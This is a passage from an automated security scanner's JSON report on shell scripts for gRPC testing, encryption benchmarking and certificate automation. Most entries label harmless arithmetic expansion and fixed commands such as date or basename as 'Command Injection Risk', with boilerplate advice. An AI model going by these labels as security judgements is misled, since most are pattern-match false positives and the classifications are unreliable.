        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_go.sh",
        "line_number": 49,
        "issue": "Path traversal pattern",
        "evidence": "\"${SCRIPT_DIR}/../scripts/generate_proto_code.py\" \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http3-quic/resources/examples/curl_http3_examples.sh",
        "line_number": 100,
        "issue": "Command substitution in shell",
        "evidence": "info \"Downloaded to /tmp/test.html ($(wc -c < /tmp/test.html) bytes)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 57,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 77,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 80,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --method UserService/GetUser",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 83,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --metadata authorization:\"Bearer token123\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 86,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --json > report.json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 89,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --iterations 100",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 194,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 196,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 220,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 221,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 223,
        "issue": "Command substitution in shell",
        "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 234,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 235,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 237,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 256,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 282,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 283,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 286,
        "issue": "Command substitution in shell",
        "evidence": "message_count=$(echo \"$output\" | jq -s 'length' 2>/dev/null || echo \"1\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 288,
        "issue": "Command substitution in shell",
        "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 298,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 299,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 301,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 321,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 334,
        "issue": "Command substitution in shell",
        "evidence": "-H \"x-request-id:$(uuidgen 2>/dev/null || echo 'test-request-id')\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 339,
        "issue": "Command substitution in shell",
        "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 344,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 372,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 380,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 381,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 383,
        "issue": "Command substitution in shell",
        "evidence": "success_count=$((success_count + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 385,
        "issue": "Command substitution in shell",
        "evidence": "error_count=$((error_count + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 389,
        "issue": "Command substitution in shell",
        "evidence": "if [ $((i % 10)) -eq 0 ]; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 406,
        "issue": "Command substitution in shell",
        "evidence": "total=$(echo \"$total + $latency\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 408,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$latency < $min\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 412,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$latency > $max\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 417,
        "issue": "Command substitution in shell",
        "evidence": "local avg=$(echo \"scale=6; $total / ${#latencies[@]}\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 418,
        "issue": "Command substitution in shell",
        "evidence": "local rps=$(echo \"scale=2; ${#latencies[@]} / $total\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 421,
        "issue": "Command substitution in shell",
        "evidence": "IFS=$'\\n' sorted_latencies=($(sort -n <<<\"${latencies[*]}\"))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 424,
        "issue": "Command substitution in shell",
        "evidence": "local p50_idx=$(( ${#sorted_latencies[@]} * 50 / 100 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 425,
        "issue": "Command substitution in shell",
        "evidence": "local p95_idx=$(( ${#sorted_latencies[@]} * 95 / 100 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 426,
        "issue": "Command substitution in shell",
        "evidence": "local p99_idx=$(( ${#sorted_latencies[@]} * 99 / 100 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 438,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  Success Rate:  $(echo \"scale=2; $success_count * 100 / $iterations\" | bc)%\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 480,
        "issue": "Command substitution in shell",
        "evidence": "results_json+=\"\\\"output\\\":\\\"$(echo \"$output\" | sed 's/\"/\\\\\"/g')\\\"\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 490,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 495,
        "issue": "Command substitution in shell",
        "evidence": "\"success_rate\": $(echo \"scale=2; $PASSED_TESTS * 100 / $TOTAL_TESTS\" | bc 2>/dev/null || echo 0)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 513,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Timestamp:   $(date)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 519,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  Success Rate:  $(echo \"scale=2; $PASSED_TESTS * 100 / $TOTAL_TESTS\" | bc)%\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 37,
        "issue": "Command substitution in shell",
        "evidence": "TEMP_DIR=$(mktemp -d)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 171,
        "issue": "Command substitution in shell",
        "evidence": "elif [[ \"$(uname)\" == \"Darwin\" ]]; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 203,
        "issue": "Command substitution in shell",
        "evidence": "K|KB) echo $((number * 1024)) ;;",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 204,
        "issue": "Command substitution in shell",
        "evidence": "M|MB) echo $((number * 1024 * 1024)) ;;",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 205,
        "issue": "Command substitution in shell",
        "evidence": "G|GB) echo $((number * 1024 * 1024 * 1024)) ;;",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 218,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1073741824}\")GB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 220,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1048576}\")MB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 222,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1024}\")KB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 245,
        "issue": "Command substitution in shell",
        "evidence": "dd if=/dev/urandom of=\"$input_file\" bs=1024 count=$((size_bytes / 1024)) 2>/dev/null",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 254,
        "issue": "Command substitution in shell",
        "evidence": "print_color \"$YELLOW\" \"Benchmarking $algo ($(bytes_to_human $size_bytes))...\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 261,
        "issue": "Command substitution in shell",
        "evidence": "-K \"$(xxd -p -c 256 \"$key_file\")\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 262,
        "issue": "Command substitution in shell",
        "evidence": "-iv \"$(xxd -p -c 256 \"$iv_file\")\" 2>/dev/null; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 264,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 265,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(((end_time - start_time) / 1000000)) # Convert to milliseconds",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 267,
        "issue": "Command substitution in shell",
        "evidence": "total_time=$((total_time + duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 268,
        "issue": "Command substitution in shell",
        "evidence": "successful_runs=$((successful_runs + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 286,
        "issue": "Command substitution in shell",
        "evidence": "local avg_time_ms=$((total_time / successful_runs))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 287,
        "issue": "Command substitution in shell",
        "evidence": "local avg_time_sec=$(awk \"BEGIN {printf \\\"%.3f\\\", $avg_time_ms/1000}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 288,
        "issue": "Command substitution in shell",
        "evidence": "local throughput_mbps=$(awk \"BEGIN {printf \\\"%.2f\\\", ($size_bytes / 1048576) / $avg_time_sec}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 289,
        "issue": "Command substitution in shell",
        "evidence": "local ops_per_sec=$(awk \"BEGIN {printf \\\"%.2f\\\", 1 / $avg_time_sec}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 296,
        "issue": "Command substitution in shell",
        "evidence": "\"file_size_human\": \"$(bytes_to_human $size_bytes)\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 327,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 333,
        "issue": "Command substitution in shell",
        "evidence": "-kdfopt salt:\"$(xxd -p -c 256 \"$salt_file\")\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 340,
        "issue": "Command substitution in shell",
        "evidence": "echo -n \"$password\" | argon2 \"$(cat \"$salt_file\")\" -t $iterations \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 351,
        "issue": "Command substitution in shell",
        "evidence": "-kdfopt salt:\"$(xxd -p -c 256 \"$salt_file\")\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 361,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 362,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(((end_time - start_time) / 1000000))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 363,
        "issue": "Command substitution in shell",
        "evidence": "total_time=$((total_time + duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 370,
        "issue": "Command substitution in shell",
        "evidence": "local avg_time_ms=$((total_time / runs))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 371,
        "issue": "Command substitution in shell",
        "evidence": "local ops_per_sec=$(awk \"BEGIN {printf \\\"%.2f\\\", 1000 / $avg_time_ms}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 490,
        "issue": "Command substitution in shell",
        "evidence": "local size_bytes=$(size_to_bytes \"$FILE_SIZE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 497,
        "issue": "Command substitution in shell",
        "evidence": "echo \"File size: $(bytes_to_human $size_bytes)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 506,
        "issue": "Command substitution in shell",
        "evidence": "if result=$(benchmark_kdf \"$kdf\" \"$kdf_iterations\"); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 507,
        "issue": "Command substitution in shell",
        "evidence": "kdf_results=$(echo \"$kdf_results\" | jq \". += [$result]\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 536,
        "issue": "Command substitution in shell",
        "evidence": "if result=$(benchmark_algorithm \"$algo\" \"$size_bytes\"); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 537,
        "issue": "Command substitution in shell",
        "evidence": "results=$(echo \"$results\" | jq \". += [$result]\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 540,
        "issue": "Command substitution in shell",
        "evidence": "print_color \"$GREEN\" \"\u2713 $algo: $(echo \"$result\" | jq -r .throughput_mbps) MB/s\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 549,
        "issue": "Command substitution in shell",
        "evidence": "--arg timestamp \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/resources/hsm-integration/examples/07-disaster-recovery.sh",
        "line_number": 15,
        "issue": "Command substitution in shell",
        "evidence": "DATE_STAMP=$(date +%Y%m%d-%H%M%S)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 224,
        "issue": "Force flag usage",
        "evidence": "--force-renewal",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 344,
        "issue": "Command substitution in shell",
        "evidence": "domain=$(basename \"$cert_dir\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 348,
        "issue": "Command substitution in shell",
